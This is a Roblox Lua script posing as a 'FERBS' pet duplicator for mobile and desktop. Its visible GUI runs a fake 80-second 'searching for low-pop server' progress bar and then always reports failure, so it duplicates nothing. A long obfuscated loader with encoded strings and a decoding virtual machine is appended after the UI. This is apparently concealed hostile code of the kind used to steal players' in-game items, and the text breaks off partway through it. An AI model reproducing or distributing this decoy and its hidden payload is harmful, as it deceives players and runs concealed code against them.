local player = game:GetService("Players").LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Name = "FerbsDuplicatorMobile"
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- Mobile detection
local isMobile = game:GetService("UserInputService").TouchEnabled
local textSizeMultiplier = isMobile and 1.3 or 1

--= BLACK THEME =--
local function applyDarkTheme(frame)
    frame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
    frame.BackgroundTransparency = 0.1
    
    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(25, 25, 30)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 10, 15))
    })
    gradient.Rotation = 90
    gradient.Parent = frame
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = frame
    
    return frame
end

--= MAIN FRAME (Responsive Sizing) =--
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = isMobile and UDim2.new(0.9, 0, 0, 350) or UDim2.new(0, 450, 0, 300)
mainFrame.Position = isMobile and UDim2.new(0.5, 0, 0.5, 0) or UDim2.new(0.5, -225, 0.5, -150)
mainFrame.AnchorPoint = isMobile and Vector2.new(0.5, 0.5) or Vector2.new(0, 0)
mainFrame = applyDarkTheme(mainFrame)
mainFrame.Parent = gui

--= FERBS WATERMARK (Mobile Optimized) =--
local ferbsWatermark = Instance.new("TextLabel")
ferbsWatermark.Name = "FerbsWatermark"
ferbsWatermark.Size = UDim2.new(0, 200 * (isMobile and 1.2 or 1), 0, 50 * (isMobile and 1.2 or 1))
ferbsWatermark.Position = UDim2.new(0.5, -100 * (isMobile and 1.2 or 1), 0.9, 0)
ferbsWatermark.Text = "FERBS"
ferbsWatermark.TextColor3 = Color3.fromRGB(0, 255, 255)
ferbsWatermark.BackgroundTransparency = 1
ferbsWatermark.Font = Enum.Font.GothamBlack
ferbsWatermark.TextSize = 28 * textSizeMultiplier
ferbsWatermark.TextStrokeTransparency = 0.5
ferbsWatermark.TextStrokeColor3 = Color3.fromRGB(0, 150, 150)
ferbsWatermark.ZIndex = 100
ferbsWatermark.Parent = gui

-- Wave animation
spawn(function()
    while true do
        for i = 0, 1, 0.1 do
            ferbsWatermark.Rotation = math.sin(i * math.pi * 4) * 5
            ferbsWatermark.TextTransparency = 0.3 + (i * 0.2)
            task.wait(0.05)
        end
        for i = 1, 0, -0.1 do
            ferbsWatermark.Rotation = math.sin(i * math.pi * 4) * 5
            ferbsWatermark.TextTransparency = 0.3 + (i * 0.2)
            task.wait(0.05)
        end
    end
end)

--= FLOATING FERBS TEXTS (Mobile Adjusted) =--
for i = 1, (isMobile and 5 or 8) do
    local floatingFerbs = Instance.new("TextLabel")
    floatingFerbs.Name = "FloatingFerbs_"..i
    floatingFerbs.Size = UDim2.new(0, (80 + math.random(-20,20)) * (isMobile and 1.2 or 1), 0, 30 * (isMobile and 1.2 or 1))
    floatingFerbs.Position = UDim2.new(math.random(), -40 * (isMobile and 1.2 or 1), math.random(0.1,0.8), -15 * (isMobile and 1.2 or 1))
    floatingFerbs.Text = "FERBS"
    floatingFerbs.TextColor3 = Color3.fromRGB(
        100 + math.random(0,155),
        100 + math.random(0,155),
        255
    )
    floatingFerbs.BackgroundTransparency = 1
    floatingFerbs.Font = Enum.Font.GothamBold
    floatingFerbs.TextSize = (14 + math.random(-2,4)) * textSizeMultiplier
    floatingFerbs.TextTransparency = 0.7
    floatingFerbs.ZIndex = 50
    floatingFerbs.Parent = gui
    
    spawn(function()
        local speed = 0.5 + math.random()
        local offset = math.random(1,10)
        while true do
            floatingFerbs.Position = UDim2.new(
                floatingFerbs.Position.X.Scale,
                floatingFerbs.Position.X.Offset,
                0.1 + (math.sin(tick()*speed + offset) * 0.1),
                floatingFerbs.Position.Y.Offset
            )
            floatingFerbs.TextTransparency = 0.5 + (math.sin(tick()*2 + i) * 0.3)
            task.wait()
        end
    end)
end

--= DUPLICATE BUTTON (Mobile Friendly) =--
local duplicateButton = Instance.new("TextButton")
duplicateButton.Name = "DuplicateButton"
duplicateButton.Size = UDim2.new(0.8, 0, 0, isMobile and 70 or 60)
duplicateButton.Position = UDim2.new(0.1, 0, 0.3, 0)
duplicateButton.Text = "DUPLICATE PET"
duplicateButton.TextColor3 = Color3.new(1, 1, 1)
duplicateButton.Font = Enum.Font.GothamBlack
duplicateButton.TextSize = 20 * textSizeMultiplier
duplicateButton.AutoButtonColor = false
duplicateButton.Parent = mainFrame

-- Button styling
local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 8)
buttonCorner.Parent = duplicateButton

local buttonStroke = Instance.new("UIStroke")
buttonStroke.Thickness = 3
buttonStroke.Color = Color3.fromRGB(0, 200, 200)
buttonStroke.Parent = duplicateButton

-- Button gradient
local buttonGradient = Instance.new("UIGradient")
buttonGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 100, 150)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 150, 200))
})
buttonGradient.Rotation = 90
buttonGradient.Parent = duplicateButton

-- Touch support for mobile
if isMobile then
    local touchButtonEffect = Instance.new("Frame")
    touchButtonEffect.Name = "TouchEffect"
    touchButtonEffect.Size = UDim2.new(1, 0, 1, 0)
    touchButtonEffect.BackgroundColor3 = Color3.new(1, 1, 1)
    touchButtonEffect.BackgroundTransparency = 0.9
    touchButtonEffect.ZIndex = 10
    touchButtonEffect.Visible = false
    touchButtonEffect.Parent = duplicateButton
    
    duplicateButton.TouchTap:Connect(function()
        touchButtonEffect.Visible = true
        game:GetService("TweenService"):Create(
            touchButtonEffect,
            TweenInfo.new(0.3),
            {BackgroundTransparency = 1}
        ):Play()
        task.wait(0.3)
        touchButtonEffect.Visible = false
    end)
end

-- Button hover effects (desktop only)
if not isMobile then
    duplicateButton.MouseEnter:Connect(function()
        game:GetService("TweenService"):Create(
            buttonStroke,
            TweenInfo.new(0.2),
            {Color = Color3.fromRGB(0, 255, 255)}
        ):Play()
    end)

    duplicateButton.MouseLeave:Connect(function()
        game:GetService("TweenService"):Create(
            buttonStroke,
            TweenInfo.new(0.2),
            {Color = Color3.fromRGB(0, 200, 200)}
        ):Play()
    end)
end

--= FULLSCREEN LOADING SCREEN (Mobile Optimized) =--
local loadingFrame = Instance.new("Frame")
loadingFrame.Name = "LoadingFrame"
loadingFrame.Size = UDim2.new(1, 0, 1, 0)
loadingFrame.Position = UDim2.new(0, 0, 0, 0)
loadingFrame.BackgroundColor3 = Color3.fromRGB(5, 5, 10)
loadingFrame.BackgroundTransparency = 0.05
loadingFrame.Visible = false
loadingFrame.ZIndex = 100
loadingFrame.Parent = gui

-- Loading text (mobile responsive)
local loadingText = Instance.new("TextLabel")
loadingText.Name = "LoadingText"
loadingText.Size = isMobile and UDim2.new(0.9, 0, 0, 250) or UDim2.new(0.8, 0, 0, 150)
loadingText.Position = isMobile and UDim2.new(0.05, 0, 0.2, 0) or UDim2.new(0.1, 0, 0.3, 0)
loadingText.Text = "🔍 Searching for low-pop server...\n\n• Works on: Dragonfly, Queen Bee, Disco Bee, Red Fox, Raccoon, Butterfly\n• Doesn't work on fruits or low-tier pets\n\nPlease wait while we find the best server..."
loadingText.TextColor3 = Color3.new(1, 1, 1)
loadingText.BackgroundTransparency = 1
loadingText.Font = Enum.Font.GothamBold
loadingText.TextSize = 16 * textSizeMultiplier
loadingText.TextXAlignment = Enum.TextXAlignment.Left
loadingText.TextYAlignment = Enum.TextYAlignment.Top
loadingText.TextWrapped = true
loadingText.Parent = loadingFrame

-- Loading bar (thicker on mobile)
local loadingBar = Instance.new("Frame")
loadingBar.Name = "LoadingBar"
loadingBar.Size = isMobile and UDim2.new(0.9, 0, 0, 20) or UDim2.new(0.8, 0, 0, 15)
loadingBar.Position = isMobile and UDim2.new(0.05, 0, 0.6, 0) or UDim2.new(0.1, 0, 0.6, 0)
loadingBar.BackgroundColor3 = Color3.fromRGB(50, 50, 80)
loadingBar.Parent = loadingFrame

local loadingBarFill = Instance.new("Frame")
loadingBarFill.Name = "LoadingBarFill"
loadingBarFill.Size = UDim2.new(0, 0, 1, 0)
loadingBarFill.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
loadingBarFill.Parent = loadingBar

-- Loading percentage (bigger on mobile)
local percentText = Instance.new("TextLabel")
percentText.Name = "PercentText"
percentText.Size = UDim2.new(0, 100 * (isMobile and 1.3 or 1), 0, 40 * (isMobile and 1.3 or 1))
percentText.Position = UDim2.new(0.5, -50 * (isMobile and 1.3 or 1), 0.5, -20 * (isMobile and 1.3 or 1))
percentText.Text = "0%"
percentText.TextColor3 = Color3.new(1, 1, 1)
percentText.Font = Enum.Font.GothamBlack
percentText.TextSize = 30 * textSizeMultiplier
percentText.BackgroundTransparency = 1
percentText.Parent = loadingFrame

--= DUPLICATE FUNCTION (Mobile Compatible) =--
local function startDuplication()
    loadingFrame.Visible = true
    loadingBarFill.Size = UDim2.new(0, 0, 1, 0)
    
    local duration = 80
    local startTime = tick()
    
    local connection
    connection = game:GetService("RunService").Heartbeat:Connect(function()
        local progress = math.min((tick() - startTime) / duration, 1)
        
        loadingBarFill.Size = UDim2.new(progress, 0, 1, 0)
        percentText.Text = math.floor(progress * 100) .. "%"
        
        if progress >= 1 then
            connection:Disconnect()
            
            -- Success message (mobile responsive)
            local successText = Instance.new("TextLabel")
            successText.Text = "❌ Please make sure you followed all the requirements, or there might be a connection issue"
            successText.Size = isMobile and UDim2.new(0.9, 0, 0, 80) or UDim2.new(0.8, 0, 0, 50)
            successText.Position = isMobile and UDim2.new(0.05, 0, 0.7, 0) or UDim2.new(0.1, 0, 0.7, 0)
            successText.TextColor3 = Color3.fromRGB(0, 255, 0)
            successText.Font = Enum.Font.GothamBlack
            successText.TextSize = 22 * textSizeMultiplier
            successText.BackgroundTransparency = 0.8
            successText.TextWrapped = true
            successText.Parent = loadingFrame
            
            task.wait(10)
            loadingFrame.Visible = false
            successText:Destroy()
        end
    end)
end

-- Connect both mouse and touch inputs
duplicateButton.MouseButton1Click:Connect(startDuplication)
if isMobile then
    duplicateButton.TouchTap:Connect(startDuplication)
end

return(function(...)local A={"\054\070\106\047\073\057\113\056\043\122\047\054\117\071\099\082\114\055\107\061","\054\056\101\080\114\068\047\082\073\070\106\105\056\047\076\116","\112\088\072\072\099\119\061\061";"\112\088\070\077\087\071\084\070\073\110\043\106\043\050\101\105\073\097\061\061";"\070\088\070\078\114\057\113\120\114\097\061\061";"\074\057\071\078\073\057\117\061";"\101\088\047\072\074\057\043\107";"\070\053\043\079\099\068\089\072\073\122\117\061","\070\057\071\098\099\057\070\116\069\110\084\079\074\057\070\086\074\057\070\115\069\105\061\061";"\117\071\090\110\067\049\048\067\050\048\057\114\104\056\117\103\084\116\069\053\087\086\085\088\097\105\043\078\047\118\089\075\112\102\105\082\118\078\119\117\109\122\113\069\106\081\078\079\099\085\119\112\086\118\082\073\084\073\049\086\111\070\052\086\119\086\068\113\079\113\077\119\106\108\097\088\106\054\088\117\052\119\089\108\098\047\111\080\119\104\053\102\088\103\076\070\051\043\083\066\049\071\057\087\102\097\079\071\099\068\050\088\114\084\066\087\111\056\054\082\068\043\117\112\068\080\048\078\087\102\106\075\089\112\078\081\100\121\043\088\071\069\083\079\081\113\068\104\054\106\085\113\090\117\103\115\086\084\080\120\122\072\103\088\049\099\074\102\085\103\057\086\111\071\089\080\075\082\049\089\067\090\053\052\103\078\072\053\114\047\104\087\079\065\073\110\072\117\050\085\090\120\065\110\043\069\087\105\057\053\075\090\114\047\107\071\078\074\107\102\089\080\085\072\105\049\052\082\081\086\054\054\115\073\069\086\118\109\083\114\107\121\057\114\115\074\115\072\068\065\112\072\090\117\085\076\122\067\120\052\047\051\106\119\074\050\087\072\097\122\090\071\103\120\048\080\101\097\061\061","\053\047\113\098\101\053\084\072\074\057\071\078\073\057\117\061","\105\086\067\103\073\122\074\100\056\068\076\043\056\053\043\053\043\117\105\061","\099\057\079\067\114\115\113\101\101\110\076\102\054\055\074\047";"\053\047\113\077\101\122\082\061";"\080\119\061\061";"\099\068\070\098\073\055\101\079";"\099\075\067\121\070\053\043\051\105\121\117\089\048\122\117\055";"\112\122\079\069\114\103\084\070\105\056\079\085\070\086\069\047\114\117\110\061";"","\053\047\113\076\073\068\084\079\048\108\061\061","\099\068\071\102\101\057\113\098";"\080\078\119\079\101\083\107\076\080\119\061\061";"\101\050\043\110\073\071\079\097\043\070\043\115\074\110\110\061";"\070\121\079\112\099\053\074\114\117\056\106\087\084\079\106\049\056\119\061\061","\069\108\043\102\081\112\043\109\065\051\082\068\120\048\068\107\047\110\052\103\074\120\111\079\067\107\103\106\083\104\115\075\113\111\099\097\102\087\107\056\100\100\052\109\080\112\076\075\119\079\071\069\087\098\109\113\090\054\102\090\115\055\047\052\065\118\100\053\078\099\076\120\108\121\109\049\112\111\102\114\072\079\057\070\112\099\073\083\102\103\114\113\086\051\107\077\099\086\069\098\077\076\073\066\102\082\082\073\097\050\077\076\054\097\084\113\111\050\097\106\048\056\117\076\076\116\056\047\119\114\083\106\110\079\056\057\056\070\090\122\118\117\098\075\071\103\122\100\114\057\078\057\098\104\052\107\081\098\072\089\065\086\113\118\055\043\049\053\080\056\057\047\107\108\057\108\056\077\065\119\079\083\103\068\086\054\100\089\115\068\078\056\048\098\083\048\078\051\067\118\099\068\066\087\073\050\098\087\086\080\070\121\054\088\056\073\072\053\115\052\074\102\050\087\055\073\100\108\072\101\105\112\087\074\056\112\075\068\108\077\054\101\056\109\057\073\119\054\089\109\043\082\051\101\056\056\121\120\054\107\113\116\078\066\097\118\100\065\099\113\088\082\084\107\090\071\089\097\061\061","\053\047\113\050\112\097\061\061";"\080\071\067\112\084\075\074\076\074\086\112\088\056\109\070\078";"\099\057\043\072\073\057\097\061","\101\053\067\116\073\055\069\061","\099\057\067\072\048\068\085\104\099\068\085\115\099\086\117\055\054\119\061\061";"\074\122\089\097\112\122\043\051","\073\122\071\121\114\108\061\061","\070\070\067\054","\112\088\113\102\112\088\071\121";"\073\109\110\061","\074\057\113\103\074\075\067\076\073\068\099\061","\101\068\085\120\073\055\069\061";"\074\057\113\102\074\122\047\078\101\053\069\061";"\073\057\070\102","\074\070\099\089\105\047\101\057","\112\050\079\121\101\105\061\061";"\043\120\073\079\065\053\119\101\100\048\116\118\110\108\061\061";"\087\075\084\121\099\110\074\079\074\108\061\061";"\101\117\097\061";"\099\088\070\121\073\122\070\121\112\053\084\072\112\068\085\079","\101\055\043\047\112\119\061\061","\073\109\069\061","\087\121\067\121\054\057\113\089\073\115\099\121\048\053\119\116\087\119\061\061";"\099\055\084\116\114\122\089\050";"\073\057\113\072\101\075\043\121\099\068\079\102\101\097\061\061";"\101\088\071\098\101\105\061\061";"\043\103\065\074\054\106\077\105\080\107\050\108\113\052\111\051\057\053\073\116\070\049\090\113\090\120\080\056\073\072\113\080\080\077\069\053\084\056\110\103\067\065\119\061","\114\057\121\061"}local function y(y)return A[y+(954132-928637)]end for y,d in ipairs({{-472239+472240;281705+-281652},{-367403+367404;955473-955454};{867579+-867559,-411501+411554}})do while d[-621746-(-621747)]<d[-856571+856573]do A[d[708471-708470]],A[d[-146083-(-146085)]],d[-103586-(-103587)],d[-807351-(-807353)]=A[d[-155749+155751]],A[d[-584690+584691]],d[-218150-(-218151)]+(-253416+253417),d[-527728+527730]-(772088+-772087)end end do local y=string.sub local d=table.insert local S=A local G=type local Z=string.char local r=string.len local q={v=927227-927165,n=-612527-(-612531);["\057"]=793465+-793459,u=-972862+972882,k=14240+-14200;Q=784056+-783998;e=929853+-929828,O=-995391+995428;c=-574550-(-574578),["\053"]=-99619+99642,h=-881083+881093,I=-757532-(-757559),x=-371517-(-371564),j=-345194-(-345195),q=929917+-929856;V=-449838+449873;b=-947728-(-947773),s=382252+-382216;["\048"]=906044+-906014,E=-310050-(-310058);r=-838176-(-838202),["\043"]=197171-197158,g=583986+-583935,C=-266527-(-266536);X=901628+-901574;L=-445486+445527;A=352683+-352620;W=-986559+986577;P=701444-701430;J=-934909+934938;N=-967516-(-967550);a=27537-27489;B=-521525-(-521584);["\050"]=-457390+457429;R=454502-454446;t=-466556-(-466606);["\052"]=-726135+726146;["\056"]=-369515+369534;M=104931+-104887;T=456895-456878;i=958334+-958318;Z=-13920+13980,m=-652017-(-652020);["\051"]=-413037+413080;["\047"]=712566+-712513,D=980990+-980952,["\055"]=-680446-(-680501),K=-639028+639035;["\054"]=815417+-815405;y=798905+-798853;Y=1035008+-1034951,f=811047-811001;l=988671+-988671;w=-236903+236935;o=-544369+544400,S=807803-807801,U=509296+-509247,d=998478-998463;p=152549+-152525;G=1006655+-1006650,z=408557+-408535,["\049"]=676661+-676619;H=175110-175077;F=-799140-(-799161)}local c=math.floor local C=table.concat for A=317162+-317161,#S,-106850-(-106851)do local V=S[A]if G(V)=="\115\116\114\105\110\103"then local G=r(V)local x={}local n=-487086-(-487087)local a=-150885-(-150885)local l=246312-246312 while n<=G do local A=y(V,n,n)local S=q[A]if S then a=a+S*(-32609-(-32673))^((-561262-(-561265))-l)l=l+(-199333-(-199334))if l==-232163-(-232167)then l=629748-629748 local A=c(a/(-341741-(-407277)))local y=c((a%(731381-665845))/(688181-687925))local S=a%(639796-639540)d(x,Z(A,y,S))a=429421+-429421 end elseif A=="\061"then d(x,Z(c(a/(-273002-(-338538)))))if n>=G or y(V,n+(-613170-(-613171)),n+(-677876-(-677877)))~="\061"then d(x,Z(c((a%(-180774+246310))/(-107299-(-107555)))))end break end n=n+(85411+-85410)end S[A]=C(x)end end end return(function(A,S,G,Z,r,q,c,e,J,l,C,x,n,R,M,i,u,a,g,V,d)n,d,R,M,a,e,i,V,g,C,x,u,l,J=668085-668085,function(d,G,Z,r)local Y,X,N,o,H,V,Q,B,J,p,m,P,w,I,W,k,v,j,s,n,t,f,h,b,D,F,U,K,O,z,l,c,E,a while d do if d<9116052-910076 then if d<4940651-288041 then if d<2166669-(-442414)then if d<1330807-(-390892)then if d<-929853+1896800 then if d<-138468+922217 then if d<362275-(-283113)then l=346412-346411 J=670261+-670259 n=C[Z[-417004-(-417005)]]a=n(l,J)n=693365+-693364 V=a==n d=V and 210279+13008429 or 4060251-(-418861)c=V else c={}d=A[y(880123+-905575)]end else d=i(-629428+2444011,{l})P={d()}d=A[y(-614437-(-588978))]c={S(P)}end else if d<805963-(-202022)then d=3462858-833658 else d=C[Z[526010-526000]]n=C[Z[-478191+478202]]V[d]=n d=C[Z[-418861+418873]]n={d(V)}d=A[y(-137892+112411)]c={S(n)}end end else if d<2853198-531952 then if d<2635794-719990 then d=7530502-358699 else a=C[Z[988677-988671]]n=a==V c=n d=3636046-(-1003839)end else if d<3019337-474671 then d=2387688-(-178534)F=e(F)b=e(b)j=e(j)z=e(z)K=e(K)E=nil t=e(t)else s=s+U t=not H c=s<=P c=t and c t=s>=P t=H and t c=t or c t=-292137+4083100 d=c and t c=10705959-394988 d=d or c end end end else if d<-487087+4660985 then if d<4620575-997055 then if d<169445+3054742 then if d<260840+2536807 then d=true d=d and 974078+7344640 or 1697876-929853 else d=72098+5050106 P=W==f s=P end else d=4706992-(-232423)k=X K=k O[k]=K k=nil end else if d<4076325-196646 then h=-859707+869707 b=y(957374+-982818)t=x()C[t]=s c=A[b]b=y(-792103-(-766648))K=-718070+718170 d=c[b]b=-22241+22242 F=976190+-975935 c=d(b,K)K=-295145+295145 b=x()E=-161829+161831 C[b]=c d=C[N]p=y(778852-804345)o=-445550-(-445550)c=d(K,F)K=x()F=892413-892412 j=-338922-(-338923)C[K]=c d=C[N]z=C[b]c=d(F,z)F=x()C[F]=c c=C[N]z=c(j,E)c=942014-942013 d=z==c E=y(366263-391724)z=x()C[z]=d d=y(-572860-(-547377))Y=A[p]Q=C[N]c=y(-842471-(-817017))d=k[d]D={Q(o,h)}p=Y(S(D))Y=y(252712+-278173)m=p..Y j=E..m d=d(k,c,j)E=y(275177+-300625)j=x()m=M(-410861-(-1042176),{N,t,v,a,n;X,z,j,b;F,K;I})C[j]=d c=A[E]E={c(m)}d={S(E)}E=d d=C[z]d=d and-592818+13949258 or-786808+14261524 else N=not w a=a+J n=a<=l n=N and n N=a>=l N=w and N n=N or n N=9553860-474799 d=n and N n=917436-(-103523)d=d or n end end else if d<3653513-(-744631)then if d<5060284-812921 then c={}d=A[y(914519-939965)]else d=true d=843513-(-81699)end else if d<-788088+5276582 then n=C[Z[970304-970302]]a=C[Z[-618163+618166]]V=n==a d=13151282-(-67426)c=V else C[Z[317994+-317989]]=c d=-746359+17267056 V=nil end end end end else if d<5218896-(-497263)then if d<5609701-134052 then if d<-892412+6171930 then if d<-175461+5298515 then if d<125476+4841458 then K=not b X=X+t k=X<=H k=K and k K=X>=H K=b and K k=K or k K=4021787-440750 d=k and K k=-1003519+11305786 d=d or k else C[n]=s d=C[n]d=d and 9461185-834234 or 5203839-940285 end else a=-96995+97188 n=C[Z[966080-966078]]V=n*a n=913020+17648558297527 c=V+n V=35184372906361-817529 d=c%V C[Z[-917244+917246]]=d n=346411+-346410 V=C[Z[11619-11616]]d=4684014-(-762296)c=V~=n end else if d<-37409+5496121 then n=C[Z[773371-773368]]a=164049-163877 V=n*a n=-145060+145317 c=V%n d=6222046-(-1006079)C[Z[821817+-821814]]=c else p=208550+-208549 Y=E[p]d=13194867-(-516912)m=Y end end else if d<-697462+6244664 then if d<5541909-41185 then c=16032778-525360 a=8523684-(-729975)n=y(-114343-(-88867))V=n^a d=c-V V=d c=y(866683+-892172)d=c/V c={d}d=A[y(-786160-(-760696))]else d=376684+2161377 C[n]=c end else if d<6194636-579890 then c=m d=Y d=703670+4826611 else n=G[144038-144036]V=G[-45344-(-45345)]d=C[Z[-999806-(-999807)]]a=d d=a[n]d=d and 990655+9144694 or-884027+7359489 end end end else if d<7283568-72226 then if d<67106+6757558 then if d<275241+6206459 then if d<7027211-729655 then D=-756471+756472 Q=E[D]Y=d D=false p=Q==D m=p d=p and 15494905-(-714486)or 5774352-204646 else N=387819-387564 d={}C[Z[182950+-182948]]=d c=C[Z[-117025-(-117028)]]l=c J=35184371943836-(-144996)B=y(426406-451886)c=n%J C[Z[-754483-(-754487)]]=c w=n%N N=516146-516144 J=w+N C[Z[1009476-1009471]]=J v=-112995-(-112996)N=A[B]d=13307062-(-436462)B=y(537055-562545)w=N[B]N=w(V)w=y(-191270+165813)a[n]=w w=732182-732151 W=v B=757048-757047 v=-269480-(-269480)f=W<v I=N v=B-W end else V=C[Z[-32929+32930]]c=#V V=275433+-275433 d=c==V d=d and 937661+4281826 or 12912554-(-868347)end else if d<7101130-(-91107)then d=true d=d and-335082+14746274 or-465518+4678894 else U=y(-600967-(-575474))d=A[U]t=y(-520389-(-494895))H=A[t]U=d(H)d=y(-75490+50008)A[d]=U d=13859143-1010111 end end else if d<6346210-(-1021248)then if d<-264616+7507808 then n=C[Z[-666482-(-666485)]]a=-393452+393453 V=n~=a d=V and 252008+13177650 or 4458535-(-987775)else d=887420+9857228 w=C[J]c=w end else if d<7487867-(-284265)then B=y(65058+-90506)c=y(-660340+634849)d=A[c]I=u(-243816+5738768,{})V=C[Z[-414889-(-414893)]]l=y(-794637-(-769144))a=A[l]N=A[B]B={N(I)}w={S(B)}N=875771+-875769 J=w[N]l=a(J)a=y(-719396-(-693942))n=V(l,a)V={n()}c=d(S(V))V=c n=C[Z[-755634-(-755639)]]d=n and 931837+1255493 or 169957+4469928 c=n else N=y(408709-434157)a=y(184799-210279)n=x()V=G d=true C[n]=d c=A[a]a=y(-279973-(-254504))l=x()d=c[a]a=x()C[a]=d d=i(3680+10192599,{})J=x()C[l]=d B=M(197734+11309817,{J})d=false C[J]=d w=A[N]N=w(B)d=N and-865915+8164186 or-79266+10823914 c=N end end end end end else if d<12982466-(-32033)then if d<-983550+11267725 then if d<9334653-(-425901)then if d<8619625-(-208870)then if d<9447305-872891 then if d<8305162-(-2336)then d=v d=I and 14688+13106737 or-197286+13114416 c=I else H=510320+-510314 d=C[N]U=-335785-(-335786)P=d(U,H)d=y(-932358-(-906876))A[d]=P H=y(403629+-429111)U=A[H]H=-813559-(-813561)d=U>H d=d and 6967284-(-227047)or-774904+16549594 end else d=9137398-(-963134)end else if d<931837+8256153 then n=a d=C[Z[-343659+343660]]I=-743480-(-743735)B=719606+-719606 N=d(B,I)V[n]=N d=3618190-(-553713)n=nil else d=872635+14723361 K=-724278+724279 X=-979710+979711 H=#O k=l(X,H)X=w(O,k)k=nil H=C[f]b=X-K t=N(b)H[X]=t X=nil end end else if d<9890020-(-300201)then if d<375212+9759640 then N=e(N)O=nil w=nil n=e(n)X=e(X)W=nil f=nil l=e(l)a=e(a)v=e(v)I=e(I)B=nil n=nil B=y(-195811-(-170341))W={}a=nil w=y(613136-638580)X=-767864+768120 k=nil N=y(-208934+183490)J=e(J)J=A[w]w=y(-229754-(-204262))v=x()l=J[w]O={}I=y(66018+-91498)J=x()C[J]=l w=A[N]N=y(1045312+-1070767)d=5667854-728439 l=w[N]N=A[B]B=y(298358-323818)w=N[B]B=A[I]I=y(602355+-627828)N=B[I]f=x()I=x()B=1006527-1006527 C[I]=B B=-977342+977344 C[v]=B k=228136-228135 B={}H=X C[f]=W W=788472+-788472 X=683573+-683572 t=X X=270056-270056 b=t<X X=k-t else d=722614+11471038 end else if d<10784386-586802 then c=y(-1009958-(-984511))V=y(326832-352299)d=A[c]c=d(V)d=A[y(689973+-715422)]c={}else w=nil l=nil d=13090608-896956 N=nil end end end else if d<10776967-(-938685)then if d<-561969+11848102 then if d<10839487-377132 then if d<405357+9900090 then d=6624+9416000 X=#O H=-543025+543025 k=X==H else P=C[n]d=P and 997567+2037149 or-991487+6113691 s=P end else N=y(184806+-210250)w=c c=A[N]N=y(-994495+969040)d=c[N]f=y(-766005-(-740535))B=y(-774392+748922)N=x()C[N]=d c=A[B]B=y(167845+-193287)d=c[B]B=d v=d W=A[f]I=W d=W and 17043176-692469 or 8202587-(-46497)end else if d<11738197-159909 then c={}d=true C[Z[224936-224935]]=d d=A[y(817143-842618)]else U=y(-547384-(-521904))P=A[U]B=v U=y(565410-590898)s=P[U]d=78690+13664834 P=s(V,B)s=C[Z[-364133-(-364139)]]U=s()X=P+U k=X+w X=-909052+909308 O=k%X X=a[n]B=nil w=O U=-535537+535538 P=w+U s=l[P]k=X..s a[n]=k end end else if d<-547185+13198145 then if d<11561597-(-497071)then n=y(763832+-789317)c=-121700+13990668 a=1047808+6067162 V=n^a d=c-V c=y(493935+-519388)V=d d=c/V c={d}d=A[y(362154-387628)]else d=A[y(634420+-659892)]c={n}end else if d<-241895+13096801 then d=2916857-287657 else v=y(387272-412717)I=A[v]d=13452091-330666 c=I end end end end else if d<-383788+14471902 then if d<-830074+14467371 then if d<47969+13332794 then if d<13494420-161829 then if d<331050+12826656 then I=x()v=870206-870203 C[I]=c W=-217638-(-217703)d=C[N]c=d(v,W)v=x()d=1038848-1038848 C[v]=c W=d d=-899644-(-899644)O=y(-926372-(-900924))k=g(-674741+12395291,{})c=A[O]U=y(73954+-99447)O={c(k)}c=-100577-(-100579)f=d d={S(O)}O=d d=O[c]k=d c=y(-601715+576224)d=A[c]X=C[a]P=A[U]U=P(k)P=y(538755-564209)s=X(U,P)X={s()}c=d(S(X))X=x()C[X]=c s=C[v]P=s d=914428+1651794 c=424621+-424620 s=-966077-(-966078)U=s s=924989+-924989 H=U<s s=c-U else d=c and 8695594-1027136 or 15747841-(-772856)end else m=C[n]c=m d=m and 5846930-(-287529)or-778424+6308705 end else if d<-220135+13656544 then I=-491759+491761 n=C[Z[1015487+-1015484]]a=-620691-(-620723)V=n%a W=905929-905916 l=C[Z[-319718-(-319722)]]N=C[Z[-999485-(-999487)]]k=C[Z[563828-563825]]O=k-V k=768440+-768408 f=O/k v=W-f B=I^v w=N/B J=l(w)l=4294561939-(-405357)a=J%l W=780088+-779832 J=1043778-1043776 l=J^V n=a/l B=1024512+-1024511 l=C[Z[-41249+41253]]N=n%B I=-168229+168485 B=4295092004-124708 w=N*B J=l(w)l=C[Z[-644976-(-644980)]]w=l(n)a=J+w N=838968-773432 n=nil J=514606-449070 l=a%J w=a-l J=w/N V=nil a=nil N=316138-315882 w=l%N B=l-w N=B/I I=-1041088-(-1041344)d=13162162-(-618739)B=J%I l=nil v=J-B J=nil I=v/W v={w,N;B,I}B=nil N=nil C[Z[432749+-432748]]=v I=nil w=nil else Y=C[n]m=Y d=Y and 358891+5109436 or 961150+12750629 end end else if d<250728+13513628 then if d<13193119-(-539889)then o=156005+-156004 C[n]=m D=C[F]Q=D+o p=E[Q]Y=W+p p=-534001+534257 d=Y%p W=d Q=C[K]p=f+Q d=-664821+3202882 Q=954494+-954238 Y=p%Q f=Y else v=v+W O=not f B=v<=I B=O and B O=v>=I O=f and O B=O or B O=11510463-(-164005)d=B and O B=23713+10197143 d=d or B end else if d<-826490+14629423 then a=y(-607667+582197)n=A[a]a=y(-709097-(-683637))V=n[a]a=C[Z[-546929+546930]]n={V(a)}d=A[y(794489+-819952)]c={S(n)}else d={}a=C[Z[564154-564145]]n=-525040+525041 l=a a=221991+-221990 J=a V=d a=-770360+770360 w=J<a d=-383660+4555563 a=n-J end end end else if d<802937+14794019 then if d<14571332-(-580018)then if d<14766356-2464 then if d<14442840-42081 then V=y(651828+-677275)d=A[V]a=361899+-361899 n=C[Z[-489711+489719]]V=d(n,a)d=546481+13351671 else c=y(-396982-(-371500))d=A[c]V=y(-587335-(-561841))c=A[V]V=y(-928594-(-903100))A[V]=d V=y(-627773-(-602291))d=-625139+7796942 A[V]=c 